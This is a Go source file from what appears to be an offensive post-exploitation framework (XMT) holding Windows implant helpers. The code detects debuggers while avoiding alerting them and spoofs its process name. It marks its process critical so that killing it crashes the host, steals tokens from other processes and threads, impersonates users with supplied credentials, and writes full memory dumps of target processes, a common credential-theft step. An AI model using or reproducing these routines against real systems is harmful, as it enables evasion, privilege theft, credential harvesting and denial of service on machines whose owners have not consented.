//go:build windows
// +build windows

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package device

import (
	"io"
	"os"
	"runtime"
	"runtime/debug"
	"strings"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// ErrNoNix is an error that is returned when a Windows device attempts a *nix
// specific function.
// var ErrNoNix = xerr.Sub("only supported on *nix devices", 0x21)

type file interface {
	File() (*os.File, error)
}
type fileFd interface {
	Fd() uintptr
}

// GoExit attempts to walk through the process threads and will forcefully
// kill all Golang based OS-Threads based on their starting address (which
// should be the same when starting from CGo).
//
// This will attempt to determine the base thread and any children that may be
// running and take action on what type of host we're in to best end the
// runtime without crashing.
//
// This function can be used on binaries, shared libraries or Zombified processes.
//
// Only works on Windows devices and is a wrapper for 'syscall.Exit(0)' for
// *nix devices.
//
// DO NOT EXPECT ANYTHING (INCLUDING DEFERS) TO HAPPEN AFTER THIS FUNCTION.
func GoExit() {
	winapi.KillRuntime()
}

// FreeOSMemory forces a garbage collection followed by an
// attempt to return as much memory to the operating system
// as possible. (Even if this is not called, the runtime gradually
// returns memory to the operating system in a background task.)
//
// On Windows, this function also calls 'SetProcessWorkingSetSizeEx(-1, -1, 0)'
// to force the OS to clear any free'd pages.
func FreeOSMemory() {
	debug.FreeOSMemory()
	winapi.EmptyWorkingSet()
}

// IsDebugged returns true if the current process is attached by a debugger.
func IsDebugged() bool {
	// Try to open the DLLs first, so we don't alert to our attempts to detect
	// a debugger.
	if len(debugDlls) > 0 {
		for _, v := range strings.Split(debugDlls, "\n") {
			if winapi.CheckDebugWithLoad(v) {
				return true
			}
		}
	}
	return winapi.IsDebugged()
}
func proxyInit() config {
	var (
		i   winapi.ProxyInfo
		err = winapi.WinHTTPGetDefaultProxyConfiguration(&i)
	)
	if err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("device.proxyInit(): Retrieving proxy info failed, falling back to no proxy: %s", err.Error())
		}
		return config{}
	}
	if i.AccessType < 3 || (i.Proxy == nil && i.ProxyBypass == nil) {
		return config{}
	}
	var (
		v = winapi.UTF16PtrToString(i.Proxy)
		b = winapi.UTF16PtrToString(i.ProxyBypass)
	)
	if len(v) == 0 && len(b) == 0 {
		return config{}
	}
	var c config
	if i := split(b); len(i) > 0 {
		c.NoProxy = strings.Join(i, ",")
	}
	for _, x := range split(v) {
		if len(x) == 0 {
			continue
		}
		q := strings.IndexByte(x, '=')
		if q > 3 {
			_ = x[4]
			if (x[0] != 'h' && x[0] != 'H') || (x[1] != 't' && x[1] != 'T') || (x[2] != 't' && x[2] != 'T') || (x[3] != 'p' && x[3] != 'P') {
				continue
			}
			if q == 4 {
				c.HTTPProxy = x[q+1:]
			}
			if x[4] != 's' && x[4] != 'S' {
				continue
			}
			if q > 5 {
				continue
			}
			c.HTTPSProxy = x[q+1:]
			continue
		}
		if len(c.HTTPProxy) == 0 {
			c.HTTPProxy = x
		}
		if len(c.HTTPSProxy) == 0 {
			c.HTTPSProxy = x
		}
	}
	if bugtrack.Enabled {
		bugtrack.Track(
			"devtools.proxyInit(): Proxy info c.HTTPProxy=%s, c.HTTPSProxy=%s, c.NoProxy=%s",
			c.HTTPProxy, c.HTTPSProxy, c.NoProxy,
		)
	}
	return c
}

// RevertToSelf function terminates the impersonation of a client application.
// Returns an error if no impersonation is being done.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func RevertToSelf() error {
	return winapi.SetAllThreadsToken(0)
}

// Whoami returns the current user name. This function is different than the
// "local.Device.User" variable as this will be fresh everytime this is called,
// but also means that any API functions called will be re-done each call and
// are not cached.
//
// If caching or multiple fast calls are needed, use the "local" package instead.
//
// This function returns an error if determining the username results in an
// error.
func Whoami() (string, error) {
	return winapi.GetLocalUser()
}
func split(s string) []string {
	if len(s) == 0 {
		return nil
	}
	if len(s) == 1 {
		return []string{s}
	}
	var (
		r []string
		x int
	)
	for i := 1; i < len(s); i++ {
		if s[i] != ';' && s[i] != ' ' {
			continue
		}
		if x == i {
			continue
		}
		for ; x < i && (s[x] == ';' || s[x] == ' '); x++ {
		}
		if x == i {
			continue
		}
		r = append(r, s[x:i])
		if x = i + 1; x > len(s) {
			break
		}
		for ; x < len(s) && (s[x] == ';' || s[x] == ' '); x++ {
		}
		i = x
	}
	if x == 0 && len(r) == 0 {
		return []string{s}
	}
	if x < len(s) {
		r = append(r, s[x:])
	}
	return r
}

// Logins returns an array that contains information about current logged
// in users.
//
// This call is OS-independent but many contain invalid session types.
//
// Always returns an empty array on WSAM/JS.
func Logins() ([]Login, error) {
	s, err := winapi.WTSGetSessions(0)
	if err != nil {
		return nil, err
	}
	if len(s) == 0 {
		return nil, nil
	}
	o := make([]Login, 0, len(s))
	for i := range s {
		if s[i].Status >= 6 && s[i].Status <= 9 {
			continue
		}
		// NOTE(dij): Should we hide the "Services" session (ID:0, Status:4)
		//            from this list?
		v := Login{
			ID:        s[i].ID,
			Host:      s[i].Host,
			Status:    s[i].Status,
			Login:     time.Unix(s[i].Login, 0),
			LastInput: time.Unix(s[i].LastInput, 0),
		}
		if v.From.SetBytes(s[i].From); len(s[i].Domain) > 0 {
			v.User = s[i].Domain + "\\" + s[i].User
		} else {
			v.User = s[i].User
		}
		o = append(o, v)
	}
	return o, nil
}

// Mounts attempts to get the mount points on the local device.
//
// On Windows devices, this is the drive letters available, otherwise on nix*
// systems, this will be the mount points on the system.
//
// The return result (if no errors occurred) will be a string list of all the
// mount points (or Windows drive letters).
func Mounts() ([]string, error) {
	d, err := winapi.GetLogicalDrives()
	if err != nil {
		return nil, xerr.Wrap("GetLogicalDrives", err)
	}
	m := make([]string, 0, 26)
	for i := uint8(0); i < 26; i++ {
		if (d & (1 << i)) == 0 {
			continue
		}
		m = append(m, string(byte('A'+i))+":\\")
	}
	return m, nil
}

// SetProcessName will attempt to override the process name on *nix systems
// by overwriting the argv block. On Windows, this just overrides the command
// line arguments.
//
// Linux support only allows for suppling a command line shorter the current
// command line.
//
// Linux found here: https://stackoverflow.com/questions/14926020/setting-process-name-as-seen-by-ps-in-go
func SetProcessName(s string) error {
	return winapi.SetCommandLine(s)
}

// SetCritical will set the critical flag on the current process. This function
// requires administrative privileges and will attempt to get the
// "SeDebugPrivilege" first before running.
//
// If successful, "critical" processes will BSOD the host when killed or will
// be prevented from running.
//
// The boolean returned is the last Critical status. It's set to True if the
// process was already marked as critical.
//
// Use this function with "false" to disable the critical flag.
//
// NOTE: THIS MUST BE DISABLED ON PROCESS EXIT OTHERWISE THE HOST WILL BSOD!!!
//
// Any errors when setting or obtaining privileges will be returned.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func SetCritical(c bool) (bool, error) {
	if err := winapi.GetDebugPrivilege(); err != nil {
		return false, err
	}
	return winapi.SetProcessIsCritical(c)
}

// Impersonate attempts to steal the Token in use by the target process of the
// supplied filter.
//
// This will set the permissions of all threads in use by the runtime. Once work
// has completed, it is recommended to call the 'RevertToSelf' function to
// revert the token changes.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func Impersonate(f *filter.Filter) error {
	// Try this as it's faster first.
	if ImpersonateThread(f) == nil {
		return nil
	}
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	// 0x2000F - TOKEN_READ (STANDARD_RIGHTS_READ | TOKEN_QUERY) | TOKEN_ASSIGN_PRIMARY
	//            TOKEN_DUPLICATE | TOKEN_IMPERSONATE
	// NOTE(dij): Might need to change this to "0x200EF" which adds "TOKEN_WRITE"
	//            access. Also not sure if we need "TOKEN_IMPERSONATE" or "TOKEN_ASSIGN_PRIMARY"
	//            as we're duplicating it.
	x, err := f.TokenFunc(0x2000F, nil)
	if err != nil {
		return err
	}
	// NOTE(dij): This function call handles differently than the 'ImpersonateUser'
	//            function. It seems only user tokens can be used for delegation
	//            and we should instead use this to impersonate an in-process token
	//            instead and copy it to all running threads, as most likely it has
	//            more rights than we currently have.
	var y uintptr
	// 0x2000000 - MAXIMUM_ALLOWED
	// 0x2       - SecurityImpersonation
	// 0x2       - TokenImpersonation
	err = winapi.DuplicateTokenEx(x, 0x2000000, nil, 2, 2, &y)
	if winapi.CloseHandle(x); err != nil {
		return err
	}
	err = winapi.SetAllThreadsToken(y)
	winapi.CloseHandle(y)
	return err
}

// ImpersonateThread attempts to steal the Token in use by the target process of
// the supplied filter using Threads and 'NtImpersonateThread'.
//
// This will set the permissions of all threads in use by the runtime. Once work
// has completed, it is recommended to call the 'RevertToSelf' function to
// revert the token changes.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func ImpersonateThread(f *filter.Filter) error {
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	// 0x0200 - THREAD_DIRECT_IMPERSONATION
	h, err := f.ThreadFunc(0x200, nil)
	if err != nil {
		return err
	}
	s := winapi.SecurityQualityOfService{ImpersonationLevel: 2}
	s.Length = uint32(unsafe.Sizeof(s))
	err = winapi.ForEachThread(func(x uintptr) error { return winapi.NtImpersonateThread(x, h, &s) })
	winapi.CloseHandle(h)
	return err
}

// DumpProcess will attempt to copy the memory of the targeted Filter to the
// supplied Writer. This fill select the first process that matches the Filter.
//
// Warning! This suspends the process, you cannot dump the same owning PID.
//
// If the Filter is nil or empty or if an error occurs during reading/writing
// an error will be returned.
//
// This function may fail if attempting to dump a process that is a different CPU
// architecture than the host process.
func DumpProcess(f *filter.Filter, w io.Writer) error {
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	winapi.GetDebugPrivilege()
	// 0x450 - PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE
	h, err := f.HandleFunc(0x450, nil)
	if err != nil {
		return err
	}
	p, err := winapi.GetProcessID(h)
	if err != nil {
		winapi.CloseHandle(h)
		return err
	}
	if p == winapi.GetCurrentProcessID() {
		winapi.CloseHandle(h)
		return xerr.Sub("cannot dump self", 0x22)
	}
	if v, ok := w.(fileFd); ok {
		// 0x2 - MiniDumpWithFullMemory
		err = winapi.MiniDumpWriteDump(h, p, v.Fd(), 0x2, nil)
		winapi.CloseHandle(h)
		return err
	}
	if v, ok := w.(file); ok {
		x, err := v.File()
		if err != nil {
			winapi.CloseHandle(h)
			return err
		}
		// 0x2 - MiniDumpWithFullMemory
		err = winapi.MiniDumpWriteDump(h, p, x.Fd(), 0x2, nil)
		winapi.CloseHandle(h)
		return err
	}
	// 0x2 - MiniDumpWithFullMemory
	err = winapi.MiniDumpWriteDump(h, p, 0, 0x2, w)
	winapi.CloseHandle(h)
	runtime.GC()
	FreeOSMemory()
	return err
}

// ImpersonateUser attempts to log in with the supplied credentials and
// impersonate the logged in account.
//
// This will set the permissions of all threads in use by the runtime. Once work
// has completed, it is recommended to call the 'RevertToSelf' function to
// revert the token changes.
//
// This impersonation is locally based, similar to impersonating a Process token.
//
// This also loads the user profile.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func ImpersonateUser(user, domain, pass string) error {
	// 0x2 - LOGON32_LOGON_INTERACTIVE
	h, err := winapi.LoginUser(user, domain, pass, 0x2, 0x0)
	if err != nil {
		return err
	}
	// 0x2000000 - MAXIMUM_ALLOWED
	// 0x2       - SecurityImpersonation
	var x uintptr
	err = winapi.DuplicateTokenEx(h, 0x2000000, nil, 2, 2, &x)
	if winapi.CloseHandle(h); err != nil {
		return err
	}
	err = winapi.SetAllThreadsToken(x)
	winapi.CloseHandle(x)
	return err
}

// ImpersonateUserNetwork attempts to log in with the supplied credentials and
// impersonate the logged in account.
//
// This will set the permissions of all threads in use by the runtime. Once work
// has completed, it is recommended to call the 'RevertToSelf' function to
// revert the token changes.
//
// This impersonation is network based, unlike impersonating a Process token.
// (Windows-only, would be cool to do a *nix one).
func ImpersonateUserNetwork(user, domain, pass string) error {
	// 0x9 - LOGON32_LOGON_NEW_CREDENTIALS
	// 0x3 - LOGON32_PROVIDER_WINNT50
	h, err := winapi.LoginUser(user, domain, pass, 0x9, 0x3)
	if err != nil {
		return err
	}
	// 0x2000000 - MAXIMUM_ALLOWED
	// 0x2       - SecurityImpersonation
	var x uintptr
	err = winapi.DuplicateTokenEx(h, 0x2000000, nil, 2, 2, &x)
	if winapi.CloseHandle(h); err != nil {
		return err
	}
	err = winapi.SetAllThreadsToken(x)
	winapi.CloseHandle(x)
	return err
}
